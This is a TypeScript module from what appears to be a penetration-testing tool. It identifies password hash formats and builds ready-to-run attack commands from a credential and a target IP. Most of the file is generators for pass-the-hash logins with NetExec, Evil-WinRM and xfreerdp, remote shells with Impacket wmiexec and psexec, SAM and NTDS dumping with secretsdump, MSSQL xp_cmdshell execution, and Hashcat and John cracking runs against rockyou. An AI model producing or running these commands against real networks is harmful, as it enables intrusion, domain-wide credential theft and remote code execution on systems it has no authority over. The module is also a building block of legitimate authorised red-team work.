/**
 * credentialAttackCrafter.ts
 * Generates offensive command-line strings, password spray payloads,
 * and unified HashForge hash identification & cracking syntaxes.
 * Supports NetExec (CME), Evil-WinRM, Impacket, SSH, RDP, Hashcat, and John the Ripper.
 */

import { CredentialItem, CredentialType, CredentialService } from '../types';

export interface AttackCommand {
  id: string;
  label: string;
  tool: 'netexec' | 'evil-winrm' | 'ssh' | 'impacket' | 'xfreerdp' | 'hashcat' | 'generic';
  badge: string;
  command: string;
  description: string;
}

export interface HashCandidate {
  name: string;
  category: 'Windows / AD' | 'Linux / Unix' | 'Web / Database' | 'Generic';
  hashcatMode: string;
  johnFormat: string;
  confidence: 'High' | 'Medium' | 'Low';
  notes?: string;
}

export interface HashCrackCommands {
  candidates: HashCandidate[];
  recommendedHashcat: string;
  recommendedJohn: string;
  hashcatCommands: { label: string; cmd: string }[];
  johnCommands: { label: string; cmd: string }[];
}

/**
 * Safely escape single quotes for POSIX shell command generation
 */
export function escapeShellArg(val: string): string {
  return "'" + (val || '').replace(/'/g, "'\\''") + "'";
}

/**
 * Comprehensive HashForge Heuristic Identifier
 * Analyzes string patterns to identify algorithm, Hashcat mode, and John format.
 */
export function analyzeAndIdentifyHash(rawHash: string): HashCrackCommands {
  const h = (rawHash || '').trim();
  const candidates: HashCandidate[] = [];

  if (h.length > 0) {
    // 1. Kerberos 5 TGS-REP (Kerberoast)
    if (h.startsWith('$krb5tgs$23$') || h.includes('$krb5tgs$')) {
      candidates.push({
        name: 'Kerberos 5 TGS-REP (Kerberoast)',
        category: 'Windows / AD',
        hashcatMode: '13100',
        johnFormat: 'krb5tgs',
        confidence: 'High',
        notes: 'Extracted via impacket-GetUserSPNs or Rubeus kerberoast.',
      });
    }

    // 2. Kerberos 5 AS-REP (ASREPRoast)
    if (h.startsWith('$krb5asrep$23$') || h.includes('$krb5asrep$')) {
      candidates.push({
        name: 'Kerberos 5 AS-REP (ASREPRoast)',
        category: 'Windows / AD',
        hashcatMode: '18200',
        johnFormat: 'krb5asrep',
        confidence: 'High',
        notes: 'Pre-authentication disabled account roast hash.',
      });
    }

    // 3. NetNTLMv2 / NTLMv2-SSP
    if (
      h.startsWith('$NETNTLMv2$') ||
      h.includes('$NETNTLMv2$') ||
      /^[a-zA-Z0-9._-]+::[a-zA-Z0-9._-]*:[0-9a-fA-F]{16}:[0-9a-fA-F]{32}:[0-9a-fA-F]+/i.test(h)
    ) {
      candidates.push({
        name: 'NetNTLMv2 (NTLMv2-SSP)',
        category: 'Windows / AD',
        hashcatMode: '5600',
        johnFormat: 'netntlmv2',
        confidence: 'High',
        notes: 'Network challenge-response hash captured via Responder, Inveigh, or mitm6.',
      });
    }

    // 4. NetNTLMv1 / NTLMv1-SSP
    if (
      h.startsWith('$NETNTLM$') ||
      h.includes('$NETNTLM$') ||
      /^[a-zA-Z0-9._-]+::[a-zA-Z0-9._-]*:[0-9a-fA-F]{16}:[0-9a-fA-F]{48}/i.test(h)
    ) {
      candidates.push({
        name: 'NetNTLMv1 (NTLMv1-SSP)',
        category: 'Windows / AD',
        hashcatMode: '5500',
        johnFormat: 'netntlm',
        confidence: 'High',
        notes: 'Legacy network challenge-response hash; crackable or relayable without MIC.',
      });
    }

    // 5. Linux SHA-512 Crypt ($6$)
    if (/^\$6\$[a-zA-Z0-9./]{1,16}\$[a-zA-Z0-9./]{86}$/.test(h) || h.startsWith('$6$')) {
      candidates.push({
        name: 'Linux SHA-512 Crypt ($6$)',
        category: 'Linux / Unix',
        hashcatMode: '1800',
        johnFormat: 'sha512crypt',
        confidence: 'High',
        notes: 'Standard Linux /etc/shadow password hash.',
      });
    }

    // 6. Linux yescrypt ($y$)
    if (/^\$y\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]+$/.test(h) || h.startsWith('$y$')) {
      candidates.push({
        name: 'Linux yescrypt ($y$)',
        category: 'Linux / Unix',
        hashcatMode: '28800',
        johnFormat: 'yescrypt',
        confidence: 'High',
        notes: 'Default Linux hashing on Debian 11+ and Ubuntu 22+.',
      });
    }

    // 7. Linux SHA-256 Crypt ($5$)
    if (/^\$5\$[a-zA-Z0-9./]{1,16}\$[a-zA-Z0-9./]{43}$/.test(h) || h.startsWith('$5$')) {
      candidates.push({
        name: 'Linux SHA-256 Crypt ($5$)',
        category: 'Linux / Unix',
        hashcatMode: '7400',
        johnFormat: 'sha256crypt',
        confidence: 'High',
      });
    }

    // 8. Linux MD5-Crypt ($1$)
    if (/^\$1\$[a-zA-Z0-9./]{1,8}\$[a-zA-Z0-9./]{22}$/.test(h) || h.startsWith('$1$')) {
      candidates.push({
        name: 'Linux MD5-Crypt ($1$)',
        category: 'Linux / Unix',
        hashcatMode: '500',
        johnFormat: 'md5crypt',
        confidence: 'High',
      });
    }

    // 9. Apache APR1 ($apr1$)
    if (/^\$apr1\$[a-zA-Z0-9./]{1,8}\$[a-zA-Z0-9./]{22}$/.test(h) || h.startsWith('$apr1$')) {
      candidates.push({
        name: 'Apache APR1 ($apr1$)',
        category: 'Web / Database',
        hashcatMode: '1600',
        johnFormat: 'md5apr1',
        confidence: 'High',
        notes: 'Used in Apache .htpasswd files.',
      });
    }

    // 10. bcrypt ($2a$, $2b$, $2y$)
    if (/^\$2[abxy]\$[0-9]{2}\$[a-zA-Z0-9./]{53}$/.test(h) || /^\$2[abxy]\$/.test(h)) {
      candidates.push({
        name: 'bcrypt ($2a$ / $2b$ / $2y$)',
        category: 'Generic',
        hashcatMode: '3200',
        johnFormat: 'bcrypt',
        confidence: 'High',
        notes: 'High-cost key derivation function common in web apps.',
      });
    }

    // 11. WordPress / phpBB3 ($P$ / $H$)
    if (/^\$[PH]\$[a-zA-Z0-9./]{31}$/.test(h)) {
      candidates.push({
        name: 'phpass (WordPress / phpBB3)',
        category: 'Web / Database',
        hashcatMode: '400',
        johnFormat: 'phpass',
        confidence: 'High',
      });
    }

    // 12. MySQL 4.1+
    if (/^\*[0-9a-fA-F]{40}$/.test(h)) {
      candidates.push({
        name: 'MySQL 4.1+ / MariaDB',
        category: 'Web / Database',
        hashcatMode: '300',
        johnFormat: 'mysql-sha1',
        confidence: 'High',
      });
    }

    // 13. 32-Hex Characters (NTLM / MD5)
    if (/^[0-9a-fA-F]{32}$/.test(h)) {
      candidates.push({
        name: 'NTLM (Windows SAM / NTDS.dit)',
        category: 'Windows / AD',
        hashcatMode: '1000',
        johnFormat: 'nt',
        confidence: 'High',
        notes: 'Standard Windows local and domain user password hash (pass-the-hash capable).',
      });
      candidates.push({
        name: 'MD5 (Raw)',
        category: 'Generic',
        hashcatMode: '0',
        johnFormat: 'raw-md5',
        confidence: 'Medium',
        notes: 'Generic unsalted 128-bit MD5 digest.',
      });
    }

    // 14. LM:NTLM pair (SAM format)
    if (/^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$/.test(h)) {
      candidates.push({
        name: 'LM:NTLM Hash Pair',
        category: 'Windows / AD',
        hashcatMode: '1000',
        johnFormat: 'nt',
        confidence: 'High',
        notes: 'Windows SAM hash pair. Hashcat mode 1000 targets the NTLM portion (second half).',
      });
    }

    // 15. 40-Hex Characters (SHA-1)
    if (/^[0-9a-fA-F]{40}$/.test(h)) {
      candidates.push({
        name: 'SHA-1 (Raw)',
        category: 'Generic',
        hashcatMode: '100',
        johnFormat: 'raw-sha1',
        confidence: 'High',
      });
    }

    // 16. 64-Hex Characters (SHA-256)
    if (/^[0-9a-fA-F]{64}$/.test(h)) {
      candidates.push({
        name: 'SHA-256 (Raw)',
        category: 'Generic',
        hashcatMode: '1400',
        johnFormat: 'raw-sha256',
        confidence: 'High',
      });
    }

    // 17. 128-Hex Characters (SHA-512)
    if (/^[0-9a-fA-F]{128}$/.test(h)) {
      candidates.push({
        name: 'SHA-512 (Raw)',
        category: 'Generic',
        hashcatMode: '1700',
        johnFormat: 'raw-sha512',
        confidence: 'High',
      });
    }
  }

  // Fallback candidate if unrecognized
  if (candidates.length === 0) {
    candidates.push({
      name: 'Generic / Unknown Hash',
      category: 'Generic',
      hashcatMode: '0',
      johnFormat: 'raw-md5',
      confidence: 'Low',
      notes: 'Unrecognized hash format. Verify length, salts, and delimiters.',
    });
  }

  const top = candidates[0];
  const escapedHash = escapeShellArg(h);
  const mode = top.hashcatMode;
  const jFmt = top.johnFormat;

  const hashcatCommands = [
    {
      label: 'Standard RockYou Wordlist (-a 0)',
      cmd: `hashcat -m ${mode} -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3`,
    },
    {
      label: 'RockYou + Best64 Mutation Rules',
      cmd: `hashcat -m ${mode} -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O -w 3`,
    },
    {
      label: 'Single Hash Inline Crack',
      cmd: `hashcat -m ${mode} ${escapedHash} /usr/share/wordlists/rockyou.txt -O`,
    },
    {
      label: 'RockYou + OneRuleToRuleThemAll',
      cmd: `hashcat -m ${mode} -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule -O`,
    },
  ];

  const johnCommands = [
    {
      label: 'John the Ripper (RockYou)',
      cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=${jFmt} hashes.txt`,
    },
    {
      label: 'John Single Hash Pipe',
      cmd: `echo ${escapedHash} > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt --format=${jFmt} hash.txt`,
    },
    {
      label: 'John Show Cracked Passwords',
      cmd: `john --format=${jFmt} --show hashes.txt`,
    },
  ];

  return {
    candidates,
    recommendedHashcat: hashcatCommands[1].cmd,
    recommendedJohn: johnCommands[0].cmd,
    hashcatCommands,
    johnCommands,
  };
}

/**
 * Heuristic detector for credential type based on secret structure
 */
export function autoDetectCredentialType(secret: string): CredentialType {
  const trimmed = (secret || '').trim();
  if (!trimmed) return 'plaintext';

  // Private keys
  if (
    trimmed.includes('BEGIN OPENSSH PRIVATE KEY') ||
    trimmed.includes('BEGIN RSA PRIVATE KEY') ||
    trimmed.includes('BEGIN PRIVATE KEY')
  ) {
    return 'ssh-key';
  }

  // Kerberos Tickets
  if (trimmed.startsWith('doIF') || trimmed.includes('krb5tgs') || trimmed.includes('ticket.kirbi')) {
    return 'ticket';
  }

  // JWT / Bearer Tokens
  if (/^ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*$/.test(trimmed)) {
    return 'token';
  }

  // Leverage unified HashForge analyzer
  const analysis = analyzeAndIdentifyHash(trimmed);
  const topCandidate = analysis.candidates[0];

  if (topCandidate && topCandidate.confidence !== 'Low') {
    if (topCandidate.hashcatMode === '1000' || topCandidate.name.includes('NTLM')) {
      return 'ntlm';
    }
    if (topCandidate.hashcatMode === '1800' || topCandidate.hashcatMode === '7400' || topCandidate.hashcatMode === '28800') {
      return 'sha512';
    }
  }

  return 'plaintext';
}

/**
 * Format credential into standard formats for wordlists or tools
 */
export function formatCredentialString(
  cred: CredentialItem,
  format: 'user:pass' | 'domain\\user:pass' | 'user@domain' | 'hashcat'
): string {
  const domain = cred.domain ? cred.domain.toUpperCase() : '';
  const user = cred.username;
  const secret = cred.secret;

  switch (format) {
    case 'domain\\user:pass':
      return domain ? `${domain}\\${user}:${secret}` : `${user}:${secret}`;
    case 'user@domain':
      return domain ? `${user}@${domain}` : user;
    case 'hashcat':
      return cred.type === 'ntlm' ? `${user}:::${secret}:::` : `${user}:${secret}`;
    case 'user:pass':
    default:
      return `${user}:${secret}`;
  }
}

/**
 * Generate tactical attack and validation commands tailored to the credential and target IP
 */
export function generateAttackCommands(
  cred: CredentialItem,
  targetIp: string,
  targetHostname?: string
): AttackCommand[] {
  const commands: AttackCommand[] = [];
  const ip = targetIp || '$TARGET';
  const user = cred.username || '$USER';
  const secret = cred.secret;
  const domain = cred.domain ? cred.domain.toUpperCase() : '';
  const domainFlag = domain ? `-d ${domain}` : '--local-auth';
  const isNtlm = cred.type === 'ntlm';
  const isKey = cred.type === 'ssh-key';
  const isPlaintext = cred.type === 'plaintext';
  const safeUser = escapeShellArg(user);
  const safeSecret = escapeShellArg(secret);

  // 1. NetExec SMB (Validation & Spray)
  if (isNtlm) {
    commands.push({
      id: 'nxc-smb-hash',
      label: 'NetExec SMB (Pass-the-Hash)',
      tool: 'netexec',
      badge: 'NXC:SMB',
      command: `netexec smb ${ip} -u ${safeUser} -H ${safeSecret} ${domainFlag}`,
      description: 'Validate SMB authentication and administrative access (Pwn3d!) using NTLM hash.',
    });
  } else if (isPlaintext) {
    commands.push({
      id: 'nxc-smb-pwd',
      label: 'NetExec SMB (Password Auth)',
      tool: 'netexec',
      badge: 'NXC:SMB',
      command: `netexec smb ${ip} -u ${safeUser} -p ${safeSecret} ${domainFlag}`,
      description: 'Validate SMB credentials against local or domain security authority.',
    });
  }

  // 2. Evil-WinRM (Remote Shell for Windows)
  if (cred.service === 'winrm' || cred.service === 'smb' || isNtlm || cred.domain) {
    if (isNtlm) {
      commands.push({
        id: 'evil-winrm-hash',
        label: 'Evil-WinRM (Pass-the-Hash Shell)',
        tool: 'evil-winrm',
        badge: 'WINRM',
        command: `evil-winrm -i ${ip} -u ${safeUser} -H ${safeSecret}`,
        description: 'Instant interactive PowerShell prompt over WinRM (port 5985) using NTLM hash.',
      });
    } else if (isPlaintext) {
      commands.push({
        id: 'evil-winrm-pwd',
        label: 'Evil-WinRM (Password Shell)',
        tool: 'evil-winrm',
        badge: 'WINRM',
        command: `evil-winrm -i ${ip} -u ${safeUser} -p ${safeSecret}`,
        description: 'Interactive PowerShell shell over WinRM with plaintext password.',
      });
    }
  }

  // 3. SSH (Linux / Unix Shell)
  if (cred.service === 'ssh' || isKey || !cred.domain) {
    if (isKey) {
      commands.push({
        id: 'ssh-key',
        label: 'SSH (Private Key Identity)',
        tool: 'ssh',
        badge: 'SSH:KEY',
        command: `chmod 600 id_rsa && ssh -i id_rsa ${escapeShellArg(`${user}@${ip}`)}`,
        description: 'Login via SSH using extracted private key with correct 0600 permissions.',
      });
    } else if (isPlaintext) {
      commands.push({
        id: 'ssh-pwd',
        label: 'SSH Interactive Login',
        tool: 'ssh',
        badge: 'SSH',
        command: `ssh ${escapeShellArg(`${user}@${ip}`)}`,
        description: 'Interactive SSH session prompt (enter password when challenged).',
      });
      commands.push({
        id: 'sshpass',
        label: 'SSH Automated Login (sshpass)',
        tool: 'ssh',
        badge: 'SSHPASS',
        command: `sshpass -p ${safeSecret} ssh -o StrictHostKeyChecking=no ${escapeShellArg(`${user}@${ip}`)}`,
        description: 'Non-interactive SSH login using sshpass utility.',
      });
    }
  }

  // 4. Impacket WMIExec / PSExec (Windows Execution)
  if (isNtlm) {
    const domainPrefix = domain ? `${domain}/` : '';
    commands.push({
      id: 'impacket-wmiexec-hash',
      label: 'Impacket WMIExec (Pass-the-Hash)',
      tool: 'impacket',
      badge: 'WMIEXEC',
      command: `impacket-wmiexec ${escapeShellArg(`${domainPrefix}${user}@${ip}`)} -hashes :${secret}`,
      description: 'Semi-interactive stealth command prompt executed through WMI without service installation.',
    });
    if (cred.isPrivileged) {
      commands.push({
        id: 'impacket-psexec-hash',
        label: 'Impacket PSExec (SYSTEM Shell)',
        tool: 'impacket',
        badge: 'PSEXEC',
        command: `impacket-psexec ${escapeShellArg(`${domainPrefix}${user}@${ip}`)} -hashes :${secret}`,
        description: 'Installs temporary service on target to obtain full NT AUTHORITY\\SYSTEM shell.',
      });
      commands.push({
        id: 'nxc-smb-sam',
        label: 'NetExec SAM Dump',
        tool: 'netexec',
        badge: 'NXC:SAM',
        command: `netexec smb ${ip} -u ${safeUser} -H ${safeSecret} ${domainFlag} --sam`,
        description: 'Dump local SAM database hashes from target registry hives.',
      });
      if (domain) {
        commands.push({
          id: 'impacket-secretsdump',
          label: 'Impacket SecretsDump (NTDS / LSA)',
          tool: 'impacket',
          badge: 'SECRETSDUMP',
          command: `impacket-secretsdump ${escapeShellArg(`${domain}/${user}@${ip}`)} -hashes :${secret}`,
          description: 'Extract NTDS.dit domain hashes and LSA secrets via DRSUAPI RPC.',
        });
      }
    }
  } else if (isPlaintext && (cred.service === 'smb' || cred.domain || cred.service === 'winrm')) {
    const domainPrefix = domain ? `${domain}/` : '';
    commands.push({
      id: 'impacket-wmiexec-pwd',
      label: 'Impacket WMIExec (Password)',
      tool: 'impacket',
      badge: 'WMIEXEC',
      command: `impacket-wmiexec ${escapeShellArg(`${domainPrefix}${user}:${secret}@${ip}`)}`,
      description: 'Semi-interactive command execution via WMI.',
    });
  }

  // 5. RDP (xfreerdp)
  if (cred.service === 'rdp' || cred.domain) {
    const dFlag = domain ? `/d:${domain} ` : '';
    const passArg = isNtlm ? `/pth:${secret}` : `/p:${safeSecret}`;
    commands.push({
      id: 'xfreerdp',
      label: 'xfreerdp Remote Desktop',
      tool: 'xfreerdp',
      badge: 'RDP',
      command: `xfreerdp /v:${ip} ${dFlag}/u:${user} ${passArg} +clipboard /dynamic-resolution`,
      description: 'Launch graphical remote desktop session with shared clipboard enabled.',
    });
  }

  // 6. MSSQL
  if (cred.service === 'mssql') {
    if (isPlaintext) {
      commands.push({
        id: 'nxc-mssql',
        label: 'NetExec MSSQL Enumeration',
        tool: 'netexec',
        badge: 'MSSQL',
        command: `netexec mssql ${ip} -u ${safeUser} -p ${safeSecret} ${domainFlag} -q 'SELECT @@version;'`,
        description: 'Execute query and test xp_cmdshell execution rights.',
      });
      commands.push({
        id: 'impacket-mssqlclient',
        label: 'Impacket mssqlclient Interactive Shell',
        tool: 'impacket',
        badge: 'MSSQLCLIENT',
        command: `impacket-mssqlclient ${escapeShellArg(`${domain ? `${domain}/` : ''}${user}:${secret}@${ip}`)}${domain ? ' -windows-auth' : ''}`,
        description: 'Interactive SQL query shell; use "enable_xp_cmdshell" then "xp_cmdshell whoami".',
      });
    }
  }

  // 7. Hashcat & John Cracking (HashForge Integration)
  if (isNtlm || cred.type === 'sha512' || cred.type === 'token') {
    const hashData = analyzeAndIdentifyHash(secret);
    const top = hashData.candidates[0];

    commands.push({
      id: 'hashcat-crack',
      label: `Hashcat Cracking (-m ${top.hashcatMode})`,
      tool: 'hashcat',
      badge: `HASHCAT:${top.hashcatMode}`,
      command: `hashcat -m ${top.hashcatMode} ${safeSecret} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O`,
      description: `Crack hash using Hashcat mode ${top.hashcatMode} (${top.name}) with rockyou dictionary and best64 rules.`,
    });

    commands.push({
      id: 'john-crack',
      label: `John the Ripper (--format=${top.johnFormat})`,
      tool: 'generic',
      badge: `JOHN:${top.johnFormat.toUpperCase()}`,
      command: `echo ${safeSecret} > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt --format=${top.johnFormat} hash.txt`,
      description: `Crack hash with John the Ripper using the ${top.johnFormat} format module.`,
    });
  }

  return commands;
}
